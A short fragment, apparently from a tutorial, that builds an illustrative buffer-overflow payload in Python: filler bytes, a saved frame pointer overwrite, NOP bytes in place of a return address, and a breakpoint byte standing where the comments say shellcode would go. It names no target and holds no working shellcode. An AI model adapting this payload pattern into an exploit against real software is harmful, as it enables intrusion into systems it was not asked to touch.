let's use a payload to hack it:

```python
payload = b"A" * 10  # Fill the buffer
payload += b"BBBB"  # Overwrite saved frame pointer
payload += b"\x90\x90\x90\x90"  # Overwrite return address with NOPs (just for illustration)
payload += b"\xCC"  # Breakpoint (for illustration; in practice, this would be shellcode)

```
